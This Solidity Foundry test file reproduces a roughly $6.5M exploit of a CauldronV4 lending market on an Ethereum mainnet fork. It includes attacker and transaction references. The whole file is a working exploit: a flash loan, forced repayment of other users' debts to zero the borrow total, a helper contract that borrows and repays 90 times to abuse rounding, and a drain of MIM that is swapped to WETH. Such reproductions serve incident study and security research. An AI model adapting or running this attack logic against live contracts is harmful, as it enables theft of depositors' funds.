// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$6,5M
// Attacker : https://etherscan.io/address/0x87f585809ce79ae39a5fa0c7c96d0d159eb678c9
// Attack Contract : https://etherscan.io/address/0x193e045bee45c7573ff89b12601c745af739ce67
// Vuln Contract : https://etherscan.io/address/0x7259e152103756e1616a77ae982353c3751a6a90
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0x26a83db7e28838dd9fee6fb7314ae58dcc6aee9a20bf224c386ff5e80f7e4cf2

// @Analysis
// https://twitter.com/kankodu/status/1752581744803680680
// https://twitter.com/Phalcon_xyz/status/1752278614551216494
// https://twitter.com/peckshield/status/1752279373779194011
// https://phalcon.blocksec.com/explorer/security-incidents

interface IDegenBox {
    function balanceOf(address, address) external view returns (uint256);

    function flashLoan(
        address borrower,
        address receiver,
        address token,
        uint256 amount,
        bytes memory data
    ) external;

    function deposit(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);

    function withdraw(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronV4 {
    function addCollateral(address to, bool skim, uint256 share) external;

    function borrow(
        address to,
        uint256 amount
    ) external returns (uint256 part, uint256 share);

    function repay(
        address to,
        bool skim,
        uint256 part
    ) external returns (uint256 amount);

    function repayForAll(uint128 amount, bool skim) external returns (uint128);

    function userBorrowPart(address) external view returns (uint256);

    function totalBorrow()
        external
        view
        returns (uint128 elastic, uint128 base);
}

contract ContractTest is Test {
    IERC20 private constant MIM =
        IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    IUSDT private constant USDT =
        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant Crv3_USD_BTC_ETH =
        IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
    IERC20 private constant yvCurve_3Crypto_f =
        IERC20(0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3);
    IERC20 private constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant WETH =
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IDegenBox private constant DegenBox =
        IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    ICauldronV4 private constant CauldronV4 =
        ICauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);
    ICurvePool private constant MIM_3LP3CRV =
        ICurvePool(0x5a6A4D54456819380173272A5E8E9B9904BdF41B);
    ICurvePool private constant USDT_WBTC_WETH =
        ICurvePool(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    Uni_Pair_V3 private constant MIM_USDC =
        Uni_Pair_V3(0x298b7c5e0770D151e4C5CF6cCA4Dae3A3FFc8E27);
    Uni_Pair_V3 private constant USDC_WETH =
        Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);

    function setUp() public {
        vm.createSelectFork("mainnet", 19118659);
        vm.label(address(MIM), "MIM");
        vm.label(address(USDT), "USDT");
        vm.label(address(WETH), "WETH");
        vm.label(address(Crv3_USD_BTC_ETH), "Crv3_USD_BTC_ETH");
        vm.label(address(yvCurve_3Crypto_f), "yvCurve_3Crypto_f");
        vm.label(address(USDC), "USDC");
        vm.label(address(DegenBox), "DegenBox");
        vm.label(address(CauldronV4), "CauldronV4");
        vm.label(address(MIM_3LP3CRV), "MIM_3LP3CRV");
        vm.label(address(USDT_WBTC_WETH), "USDT_WBTC_WETH");
        vm.label(address(MIM_USDC), "MIM_USDC");
        vm.label(address(USDC_WETH), "USDC_WETH");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter MIM balance before attack",
            MIM.balanceOf(address(this)),
            MIM.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );

        MIM.approve(address(DegenBox), type(uint256).max);
        MIM.approve(address(MIM_3LP3CRV), type(uint256).max);
        USDT.approve(address(USDT_WBTC_WETH), type(uint256).max);
        Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);
        yvCurve_3Crypto_f.approve(address(DegenBox), type(uint256).max);

        DegenBox.flashLoan(
            address(this),
            address(this),
            address(MIM),
            300_000 * 1e18,
            ""
        );

        // Exchange MIM to USDT
        MIM_3LP3CRV.exchange_underlying(0, 2, 4_300_000 * 1e18, 0);

        // Obtain USDC tokens
        MIM_USDC.swap(
            address(this),
            true,
            100_000 * 1e18,
            75_212_254_740_446_025_735_711,
            ""
        );

        // Obtain WETH tokens
        USDC_WETH.swap(
            address(this),
            true,
            int256(USDC.balanceOf(address(this))),
            1_567_565_235_711_739_205_094_520_276_811_199,
            ""
        );

        emit log_named_decimal_uint(
            "Exploiter MIM balance after attack",
            MIM.balanceOf(address(this)),
            MIM.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        (uint128 elastic, ) = CauldronV4.totalBorrow();
        uint128 amount = uint128(
            uint128(elastic + uint128(50e18)) - uint128(240_000 * 1e18)
        );

        DegenBox.deposit(
            address(MIM),
            address(this),
            address(DegenBox),
            amount,
            0
        );
        MIM.transfer(address(CauldronV4), 240_000 * 1e18);
        CauldronV4.repayForAll(uint128(240_000 * 1e18), true);

        address[] memory users = new address[](15);
        users[0] = 0x941ec857134B13c255d6EBEeD1623b1904378De9;
        users[1] = 0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2;
        users[2] = 0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc;
        users[3] = 0xc3Be098f9594E57A3e71f485a53d990FE3961fe5;
        users[4] = 0xEe64495BF9894f6c0A2Df4ac983581AADb87f62D;
        users[5] = 0xe435BEbA6DEE3D6F99392ab9568777EB8165719d;
        users[6] = 0xc0433E26E3D2Ae7D1D80E39a6D58062D1eAA54f5;
        users[7] = 0x2c561aB0Ed33E40c70ea380BaA0dBC1ae75Ccd34;
        users[8] = 0x33D778eD712C8C4AdD5A07baB012d1ce7bb0B4C7;
        users[9] = 0x214BE7eBEc865c25c83DF5B343E45Aa3Bf8Df881;
        users[10] = 0x3B473F790818976d207C2AcCdA42cb432b749451;
        users[11] = 0x48ED01117a130b660272228728e07eF9efe21A30;
        users[12] = 0x7E1C8fEF68a87F7BdDf4ae644Fe4D6e6362F5fF1;
        users[13] = 0xD24cb02BEd630BAA49887168440D90BE8DA6708c;
        users[14] = 0x0aB7999894F36eDe923278d4E898e78085B289e6;

        uint8 i;
        while (i < users.length) {
            uint256 borrowPart = CauldronV4.userBorrowPart(users[i]);
            if (borrowPart > 0) {
                CauldronV4.repay(users[i], true, borrowPart);
            }
            ++i;
        }
        handleSpecialUser();

        // Exchange portion of MIM balance for USDT
        MIM_3LP3CRV.exchange_underlying(0, 3, 2_000 * 1e18, 0);

        // Add exchanged USDT amount as liquidity to the pool. Receive (mint) Crv3_USD_BTC_ETH in return
        uint256[3] memory amounts;
        amounts[0] = USDT.balanceOf(address(this));
        amounts[1] = 0;
        amounts[2] = 0;
        // USDT_WBTC_WETH.add_liquidity(amounts, 0);
        (bool success, ) = address(USDT_WBTC_WETH).call(
            abi.encodeWithSelector(bytes4(0x4515cef3), amounts, 0)
        );
        require(success);

        // yvCurve_3Crypto_f.deposit(Crv3_USD_BTC_ETH.balanceOf(address(this)));
        (success, ) = address(yvCurve_3Crypto_f).call(
            abi.encodeWithSelector(
                bytes4(0xb6b55f25),
                Crv3_USD_BTC_ETH.balanceOf(address(this))
            )
        );
        require(success);

        // Deposit yvCurve_3Crypto_f balance
        uint256 depositAmount = yvCurve_3Crypto_f.balanceOf(address(this));
        DegenBox.deposit(
            address(yvCurve_3Crypto_f),
            address(this),
            address(CauldronV4),
            depositAmount,
            0
        );

        HelperExploitContract helper = new HelperExploitContract();
        // borrow and repay * 90x
        helper.exploit();

        CauldronV4.addCollateral(address(this), true, depositAmount - 100);
        CauldronV4.borrow(
            address(this),
            DegenBox.balanceOf(address(MIM), address(CauldronV4))
        );
        DegenBox.withdraw(
            address(MIM),
            address(this),
            address(this),
            DegenBox.balanceOf(address(MIM), address(this)),
            0
        );

        // Repaying flashloan
        MIM.transfer(address(DegenBox), 300_000 * 1e18 + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        if (msg.sender == address(MIM_USDC)) {
            MIM.transfer(address(MIM_USDC), uint256(amount0Delta));
        } else {
            USDC.transfer(address(USDC_WETH), uint256(amount0Delta));
        }
    }

    function handleSpecialUser() internal {
        address specialUser = 0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A;
        uint256 borrowPart = CauldronV4.userBorrowPart(specialUser);
        CauldronV4.repay(specialUser, true, borrowPart - 100);
        for (uint8 i; i < 3; ++i) {
            CauldronV4.repay(specialUser, true, 1);
        }
        (uint128 elastic, ) = CauldronV4.totalBorrow();
        require(elastic == 0);
    }
}

contract HelperExploitContract {
    ICauldronV4 private constant CauldronV4 =
        ICauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);

    function exploit() external {
        CauldronV4.addCollateral(address(this), true, 100);
        CauldronV4.borrow(address(this), 1);

        uint8 i;
        while (i < 90) {
            CauldronV4.borrow(address(this), 1);
            CauldronV4.repay(address(this), true, 1);
            ++i;
        }
        CauldronV4.repay(address(this), true, 1);
    }

    receive() external payable {}
}
